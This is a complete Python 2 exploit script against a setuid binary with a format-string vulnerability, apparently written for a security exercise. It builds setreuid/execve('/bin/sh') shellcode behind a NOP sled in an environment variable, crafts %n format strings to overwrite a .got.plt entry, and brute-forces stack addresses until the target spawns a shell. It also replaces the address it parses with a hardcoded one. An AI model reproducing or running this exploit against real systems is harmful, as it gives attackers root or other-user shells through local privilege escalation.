#!/usr/bin/python

import sys
import os
import stat
import re
import subprocess

def x_bite_hex(str_num,size):
    num = hex(str_num).split("x")[1]

    while len(num) < size:
        num = '0' + num

    return num

def hex_to_string(num):
    res_str = ''

    pairs = re.findall("([0-9a-f]{2})",num,flags=re.IGNORECASE)

    for pair in pairs:
        res_str = chr(int(pair,16)) + res_str

    if res_str == '':
        return None
    else:
        return res_str    

def uid_to_string(x):
    if x is None or x <= 0:
        return None

    num = x_bite_hex(x,4)

    return hex_to_string(num)

def set_eggshell(uid,eggsize):
    str_uid = uid_to_string(uid)

    shellcode =  "\x55"
    shellcode += "\x89\xe5"

    shellcode += "\x31\xc0"
    shellcode += "\x31\xdb"
    shellcode += "\x31\xc9"
    shellcode += "\xb0\x46"

    if str_uid is not None:
        shellcode += "\x66\xbb" + str_uid
        shellcode += "\x66\xb9" + str_uid

    shellcode += "\xcd\x80"
    
    shellcode += "\x31\xc0"
    shellcode += "\x50"
    shellcode += "\x68\x2f\x2f\x73\x68"
    shellcode += "\x68\x2f\x62\x69\x6e"
    shellcode += "\x89\xe3"
    shellcode += "\x31\xc9"
    shellcode += "\x31\xd2"
    shellcode += "\xb0\x0b"
    shellcode += "\xcd\x80"

    eggshell = "\x90"*eggsize + shellcode
    os.environ['EGG'] = eggshell

def get_uid(path):
    try:
        st = os.stat(path)
    except:
        print "[-] The target " + path + " does not exist"
        exit(0)

    return st.st_uid

def get_dtors(path):
    output = subprocess.check_output(["readelf","-S",path])
    lines = output.split("\n")
    
    dtors_line = None
    for line in lines:
        if ".got.plt" in line:
            dtors_line = line
            break

    dtor = re.findall("([0-9a-f]{8})",dtors_line,flags=re.IGNORECASE)[0]
    size = re.findall("([0-9a-f]{6})",dtors_line,flags=re.IGNORECASE)[2]

    dtor = '08049618'

    return int(dtor,16),int(size,16)

def build_formatstring(dtors,offset,egg):
    fs = ''

    addr = x_bite_hex(dtors,8)
    for i in range(4):
        fs += hex_to_string(addr)
        fs += hex_to_string(addr)
        fs += 'AAAA'
        addr = x_bite_hex(int(addr,16)+1,8)

    printed = len(fs)

    for i in range(offset):
        fs += "%08x"

    printed += offset*8

    egg_addr = x_bite_hex(egg,8)
    pairs = re.findall("([0-9a-f]{2})",egg_addr,flags=re.IGNORECASE)

    for pair in reversed(pairs):
        to_print = int(pair,16) + 0x100
        printed %= 0x100
        padding = (to_print - printed) % 0x100

        if padding < 10:
            padding += 0x100

        fs += "%0" + str(padding) + "u%n%08x"
        printed += padding + 8

    return fs

def main():
    if len(sys.argv) < 2:
        print "[-] Usage: ./exploit7.py target"
        exit(0)

    target = sys.argv[1]
    print "[+] Exploit Target: " + target
    
    uid = get_uid(target)
    print "[+] Using UID " + str(uid)

    dtors,dsize = get_dtors(target)
    print "[+] Using .dtors entry at " + hex(dtors)    
    print "[+] .dtors size " + hex(dsize)    

    set_eggshell(uid,0x10000)
    print "[+] Eggshell set"    

    for i in range(16):
        egg_addr = 0xbff00000 + 0x10000*i  
        print "[+] Trying egg_addr = " + hex(egg_addr)

        for j in range(10):
#            for k in range(0,dsize,4):
 #               print '[*] dtors+k = ' + hex(dtors+k)
            fs = build_formatstring(dtors,j,egg_addr)
            ret = subprocess.call([target,fs])
            
            if ret == 0:
                print "[+] Exiting exploit"
                exit(0)

    print "[+] Exploit finished without success"

main()
